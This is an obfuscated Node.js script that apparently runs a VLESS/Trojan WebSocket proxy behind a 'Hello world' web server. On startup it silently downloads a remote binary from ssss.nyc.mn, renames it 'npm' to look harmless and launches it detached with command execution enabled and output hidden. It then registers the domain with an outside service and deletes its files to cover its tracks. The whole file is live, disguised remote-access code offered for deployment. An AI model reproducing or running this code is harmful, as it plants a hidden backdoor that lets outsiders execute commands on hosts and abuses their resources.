const _0xe488=['arch','catch','once','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm','readUInt16BE','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Failed\x20to\x20resolve\x20','every','slice','chmod\x20+x\x20npm','send','net','npm\x20running\x20error:','8.8.4.4','child_process','8443','443','digest','substr','30098e0e-238f-4aeb-837f-3d860e14c293','text/html','writeHead','connect','stream','write','listen','replace','split','pop','length','Status','test','&type=A','sha224','config.yaml','Answer','&fp=chrome&type=ws&host=','2087','npm\x20is\x20already\x20running,\x20skip\x20running...','application/json','concat','end','index.html','npm\x20download\x20successfully','createServer','utf-8','DOMAIN','createWriteStream','writeFileSync','false','utf8','pipe','get','axios','/bin/bash','WSPATH','reduce','country_code','UUID',':443?security=tls&sni=','log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','join','\x20with\x20all\x20DNS\x20servers','from','crypto','NEZHA_PORT','map','aarch64','createHash','close','2083','error:\x20','hex','includes','https://dns.google/resolve?name=','https://oooo.serv00.net/add-url','buffer','then','isp','NAME','env','Not\x20Found\x0a','PORT','Hello\x20world!','error','toString','update','data','client_secret:\x20','2096'];const _0x5422=function(_0xe488a0,_0x542225){_0xe488a0=_0xe488a0-0x0;let _0x51a3fc=_0xe488[_0xe488a0];return _0x51a3fc;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x5422('0x36'));const net=require(_0x5422('0xc'));const path=require('path');const crypto=require(_0x5422('0x42'));const {Buffer}=require(_0x5422('0x4e'));const {exec,execSync}=require(_0x5422('0xf'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x5422('0x3b')]||_0x5422('0x14');const NEZHA_SERVER=process['env']['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x5422('0x52')][_0x5422('0x43')]||'';const NEZHA_KEY=process['env']['NEZHA_KEY']||'';const DOMAIN=process[_0x5422('0x52')][_0x5422('0x2f')]||'1234.abc.com';const AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![];const WSPATH=process[_0x5422('0x52')][_0x5422('0x38')]||UUID[_0x5422('0x9')](0x0,0x8);const SUB_PATH=process[_0x5422('0x52')]['SUB_PATH']||'sub';const NAME=process[_0x5422('0x52')][_0x5422('0x51')]||'';const PORT=process['env'][_0x5422('0x54')]||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x102803=await axios[_0x5422('0x35')]('https://api.ip.sb/geoip');const _0x16974c=_0x102803['data'];ISP=(_0x16974c[_0x5422('0x3a')]+'-'+_0x16974c[_0x5422('0x50')])[_0x5422('0x1b')](/ /g,'_');}catch(_0x292cd7){ISP='Unknown';}};GetISP();const httpServer=http[_0x5422('0x2d')]((_0x43f002,_0x1e3c82)=>{if(_0x43f002['url']==='/'){const _0x23597e=path[_0x5422('0x3f')](__dirname,_0x5422('0x2b'));fs['readFile'](_0x23597e,_0x5422('0x33'),(_0xfabe1f,_0x36de0d)=>{if(_0xfabe1f){_0x1e3c82[_0x5422('0x16')](0xc8,{'Content-Type':_0x5422('0x15')});_0x1e3c82[_0x5422('0x2a')](_0x5422('0x55'));return;}_0x1e3c82['writeHead'](0xc8,{'Content-Type':'text/html'});_0x1e3c82[_0x5422('0x2a')](_0x36de0d);});return;}else if(_0x43f002['url']==='/'+SUB_PATH){const _0x135ae1=NAME?NAME+'-'+ISP:ISP;const _0x548556='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x135ae1;const _0x4a560c='trojan://'+UUID+'@'+DOMAIN+_0x5422('0x3c')+DOMAIN+_0x5422('0x25')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x135ae1;const _0x3e98e9=_0x548556+'\x0a'+_0x4a560c;const _0x1a7ccd=Buffer[_0x5422('0x41')](_0x3e98e9)['toString']('base64');_0x1e3c82[_0x5422('0x16')](0xc8,{'Content-Type':'text/plain'});_0x1e3c82['end'](_0x1a7ccd+'\x0a');}else{_0x1e3c82['writeHead'](0x194,{'Content-Type':'text/plain'});_0x1e3c82[_0x5422('0x2a')](_0x5422('0x53'));}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x5422('0xe'),'1.1.1.1'];function resolveHost(_0x56cfa3){return new Promise((_0x3aadb6,_0x19e96c)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5422('0x20')](_0x56cfa3)){_0x3aadb6(_0x56cfa3);return;}let _0x258489=0x0;function _0x1acdf9(){if(_0x258489>=DNS_SERVERS['length']){_0x19e96c(new Error(_0x5422('0x7')+_0x56cfa3+_0x5422('0x40')));return;}const _0x5398f8=DNS_SERVERS[_0x258489];_0x258489++;const _0x20c260=_0x5422('0x4c')+encodeURIComponent(_0x56cfa3)+_0x5422('0x21');axios['get'](_0x20c260,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5422('0x4f')](_0x3f9aa2=>{const _0x3fc619=_0x3f9aa2['data'];if(_0x3fc619[_0x5422('0x1f')]===0x0&&_0x3fc619['Answer']&&_0x3fc619[_0x5422('0x24')][_0x5422('0x1e')]>0x0){const _0x42744a=_0x3fc619[_0x5422('0x24')]['find'](_0x38bf08=>_0x38bf08['type']===0x1);if(_0x42744a){_0x3aadb6(_0x42744a[_0x5422('0x59')]);return;}}_0x1acdf9();})['catch'](_0x23c4e6=>{_0x1acdf9();});}_0x1acdf9();});}function handleVlessConnection(_0x28ef97,_0x1b9b5c){const [_0xb4d39c]=_0x1b9b5c;const _0x53f7fe=_0x1b9b5c[_0x5422('0x9')](0x1,0x11);if(!_0x53f7fe[_0x5422('0x8')]((_0xec63f0,_0x5af30d)=>_0xec63f0==parseInt(uuid[_0x5422('0x13')](_0x5af30d*0x2,0x2),0x10)))return![];let _0x3696d9=_0x1b9b5c[_0x5422('0x9')](0x11,0x12)['readUInt8']()+0x13;const _0x208fa5=_0x1b9b5c['slice'](_0x3696d9,_0x3696d9+=0x2)['readUInt16BE'](0x0);const _0x380552=_0x1b9b5c[_0x5422('0x9')](_0x3696d9,_0x3696d9+=0x1)['readUInt8']();const _0x515ff0=_0x380552==0x1?_0x1b9b5c[_0x5422('0x9')](_0x3696d9,_0x3696d9+=0x4)[_0x5422('0x3f')]('.'):_0x380552==0x2?new TextDecoder()['decode'](_0x1b9b5c[_0x5422('0x9')](_0x3696d9+0x1,_0x3696d9+=0x1+_0x1b9b5c['slice'](_0x3696d9,_0x3696d9+0x1)['readUInt8']())):_0x380552==0x3?_0x1b9b5c[_0x5422('0x9')](_0x3696d9,_0x3696d9+=0x10)[_0x5422('0x39')]((_0x1450f1,_0x115aee,_0x3a9e68,_0x3338c4)=>_0x3a9e68%0x2?_0x1450f1['concat'](_0x3338c4['slice'](_0x3a9e68-0x1,_0x3a9e68+0x1)):_0x1450f1,[])[_0x5422('0x44')](_0x516823=>_0x516823[_0x5422('0x5')](0x0)[_0x5422('0x57')](0x10))['join'](':'):'';_0x28ef97[_0x5422('0xb')](new Uint8Array([_0xb4d39c,0x0]));const _0xe4f9a1=createWebSocketStream(_0x28ef97);resolveHost(_0x515ff0)[_0x5422('0x4f')](_0x1807b8=>{net['connect']({'host':_0x1807b8,'port':_0x208fa5},function(){this[_0x5422('0x19')](_0x1b9b5c['slice'](_0x3696d9));_0xe4f9a1['on'](_0x5422('0x56'),()=>{})[_0x5422('0x34')](this)['on']('error',()=>{})['pipe'](_0xe4f9a1);})['on'](_0x5422('0x56'),()=>{});})['catch'](_0x4dbb93=>{net[_0x5422('0x17')]({'host':_0x515ff0,'port':_0x208fa5},function(){this[_0x5422('0x19')](_0x1b9b5c['slice'](_0x3696d9));_0xe4f9a1['on'](_0x5422('0x56'),()=>{})[_0x5422('0x34')](this)['on'](_0x5422('0x56'),()=>{})['pipe'](_0xe4f9a1);})['on'](_0x5422('0x56'),()=>{});});return!![];}function handleTrojanConnection(_0x416f98,_0x2fabc5){try{if(_0x2fabc5['length']<0x3a)return![];const _0x497954=_0x2fabc5[_0x5422('0x9')](0x0,0x38)['toString']();const _0x3298f7=[UUID];let _0xe62f69=null;for(const _0x24cefb of _0x3298f7){const _0x443420=crypto[_0x5422('0x46')](_0x5422('0x22'))[_0x5422('0x58')](_0x24cefb)[_0x5422('0x12')](_0x5422('0x4a'));if(_0x443420===_0x497954){_0xe62f69=_0x24cefb;break;}}if(!_0xe62f69)return![];let _0x3c67fa=0x38;if(_0x2fabc5[_0x3c67fa]===0xd&&_0x2fabc5[_0x3c67fa+0x1]===0xa){_0x3c67fa+=0x2;}const _0x981756=_0x2fabc5[_0x3c67fa];if(_0x981756!==0x1)return![];_0x3c67fa+=0x1;const _0x52a802=_0x2fabc5[_0x3c67fa];_0x3c67fa+=0x1;let _0x374607,_0x4be268;if(_0x52a802===0x1){_0x374607=_0x2fabc5['slice'](_0x3c67fa,_0x3c67fa+0x4)['join']('.');_0x3c67fa+=0x4;}else if(_0x52a802===0x3){const _0x35acbc=_0x2fabc5[_0x3c67fa];_0x3c67fa+=0x1;_0x374607=_0x2fabc5['slice'](_0x3c67fa,_0x3c67fa+_0x35acbc)[_0x5422('0x57')]();_0x3c67fa+=_0x35acbc;}else if(_0x52a802===0x4){_0x374607=_0x2fabc5[_0x5422('0x9')](_0x3c67fa,_0x3c67fa+0x10)[_0x5422('0x39')]((_0x13368b,_0x2eb168,_0x214e2b,_0x4819b2)=>_0x214e2b%0x2?_0x13368b[_0x5422('0x29')](_0x4819b2['slice'](_0x214e2b-0x1,_0x214e2b+0x1)):_0x13368b,[])[_0x5422('0x44')](_0x586467=>_0x586467[_0x5422('0x5')](0x0)['toString'](0x10))['join'](':');_0x3c67fa+=0x10;}else{return![];}_0x4be268=_0x2fabc5['readUInt16BE'](_0x3c67fa);_0x3c67fa+=0x2;if(_0x3c67fa<_0x2fabc5['length']&&_0x2fabc5[_0x3c67fa]===0xd&&_0x2fabc5[_0x3c67fa+0x1]===0xa){_0x3c67fa+=0x2;}const _0x59ee87=createWebSocketStream(_0x416f98);resolveHost(_0x374607)[_0x5422('0x4f')](_0x36ea39=>{net[_0x5422('0x17')]({'host':_0x36ea39,'port':_0x4be268},function(){if(_0x3c67fa<_0x2fabc5[_0x5422('0x1e')]){this[_0x5422('0x19')](_0x2fabc5[_0x5422('0x9')](_0x3c67fa));}_0x59ee87['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x5422('0x34')](_0x59ee87);})['on']('error',()=>{});})[_0x5422('0x1')](_0x3778cb=>{net[_0x5422('0x17')]({'host':_0x374607,'port':_0x4be268},function(){if(_0x3c67fa<_0x2fabc5['length']){this['write'](_0x2fabc5['slice'](_0x3c67fa));}_0x59ee87['on']('error',()=>{})[_0x5422('0x34')](this)['on']('error',()=>{})['pipe'](_0x59ee87);})['on']('error',()=>{});});return!![];}catch(_0xe05018){return![];}}wss['on']('connection',(_0xaf9f5,_0x356f6a)=>{const _0x4e33f8=_0x356f6a['url']||'';_0xaf9f5[_0x5422('0x2')]('message',_0xffacb9=>{if(_0xffacb9['length']>0x11&&_0xffacb9[0x0]===0x0){const _0x5e74e2=_0xffacb9[_0x5422('0x9')](0x1,0x11);const _0x40e82d=_0x5e74e2[_0x5422('0x8')]((_0x4ce730,_0x1e35a8)=>_0x4ce730==parseInt(uuid[_0x5422('0x13')](_0x1e35a8*0x2,0x2),0x10));if(_0x40e82d){if(!handleVlessConnection(_0xaf9f5,_0xffacb9)){_0xaf9f5[_0x5422('0x47')]();}return;}}if(!handleTrojanConnection(_0xaf9f5,_0xffacb9)){_0xaf9f5['close']();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x351d3a=os[_0x5422('0x0')]();if(_0x351d3a==='arm'||_0x351d3a==='arm64'||_0x351d3a===_0x5422('0x45')){if(!NEZHA_PORT){return'https://arm64.ssss.nyc.mn/v1';}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1baf08=getDownloadUrl();const _0x56d320=await axios({'method':_0x5422('0x35'),'url':_0x1baf08,'responseType':_0x5422('0x18')});const _0x4cc4ba=fs[_0x5422('0x30')](_0x5422('0x4'));_0x56d320[_0x5422('0x59')]['pipe'](_0x4cc4ba);return new Promise((_0x30e2bd,_0x1ae151)=>{_0x4cc4ba['on']('finish',()=>{console['log'](_0x5422('0x2c'));exec(_0x5422('0xa'),_0x36e5a7=>{if(_0x36e5a7)_0x1ae151(_0x36e5a7);_0x30e2bd();});});_0x4cc4ba['on']('error',_0x1ae151);});}catch(_0xf728dd){throw _0xf728dd;}};const runnz=async()=>{try{const _0x8193f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x5422('0x2e')});if(_0x8193f['trim']()!==''){console[_0x5422('0x3d')](_0x5422('0x27'));return;}}catch(_0x375f13){}await downloadFile();let _0x3bd0e8='';let _0x1202bf=[_0x5422('0x11'),_0x5422('0x10'),_0x5422('0x5b'),_0x5422('0x26'),_0x5422('0x48'),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x57e002=_0x1202bf['includes'](NEZHA_PORT)?'--tls':'';_0x3bd0e8='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x57e002+_0x5422('0x3e');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11ad4c=NEZHA_SERVER[_0x5422('0x4b')](':')?NEZHA_SERVER[_0x5422('0x1c')](':')[_0x5422('0x1d')]():'';const _0x8bbe17=_0x1202bf['includes'](_0x11ad4c)?'true':_0x5422('0x32');const _0x325667=_0x5422('0x5a')+NEZHA_KEY+_0x5422('0x3')+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x8bbe17+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5422('0x31')](_0x5422('0x23'),_0x325667);}_0x3bd0e8='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5422('0x3d')](_0x5422('0x6'));return;}try{exec(_0x3bd0e8,{'shell':_0x5422('0x37')},_0x38a6a2=>{if(_0x38a6a2)console['error'](_0x5422('0xd'),_0x38a6a2);else console[_0x5422('0x3d')]('npm\x20is\x20running');});}catch(_0x5aea4b){console[_0x5422('0x56')](_0x5422('0x49')+_0x5aea4b);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x52ebe7='https://'+DOMAIN;try{const _0x28720f=await axios['post'](_0x5422('0x4d'),{'url':_0x52ebe7},{'headers':{'Content-Type':_0x5422('0x28')}});console[_0x5422('0x3d')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x73be16){}}const delFiles=()=>{fs['unlink'](_0x5422('0x4'),()=>{});fs['unlink'](_0x5422('0x23'),()=>{});};httpServer[_0x5422('0x1a')](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x5422('0x3d')]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
